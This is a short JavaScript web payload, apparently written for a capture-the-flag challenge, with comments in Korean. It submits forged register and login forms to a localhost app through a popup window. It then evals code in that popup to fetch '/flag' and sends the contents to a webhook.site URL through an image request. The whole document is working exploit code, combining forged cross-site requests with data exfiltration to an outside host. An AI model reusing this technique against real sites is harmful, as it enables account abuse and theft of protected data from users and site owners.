<script>
var p = window.open("about:blank", "popup");

/* 1. register */
let f1 = document.createElement("form");
f1.method = "POST";
f1.action = "http://localhost:3000/register";
f1.target = "popup";
f1.innerHTML = `
<input name="username" value="poptest">
<input name="password" value="poptest">
`;
document.body.appendChild(f1);
f1.submit();

/* 2. login */
setTimeout(() => {
  let f2 = document.createElement("form");
  f2.method = "POST";
  f2.action = "http://localhost:3000/login";
  f2.target = "popup";
  f2.innerHTML = `
  <input name="username" value="poptest">
  <input name="password" value="poptest">
  `;
  document.body.appendChild(f2);
  f2.submit();
}, 400);

/* 3. same-origin HTML 확보 */
setTimeout(() => {
  p.location = "http://localhost:3000/";
}, 900);

/* 4. ❌ javascript: 말고, popup에서 fetch 실행 */
setTimeout(() => {
  p.eval(`
    fetch('/flag')
      .then(r => r.text())
      .then(f => {
        new Image().src =
          'https://webhook.site/showontest?flag=' +
          encodeURIComponent(f);
      });
  `);
}, 1400);
</script>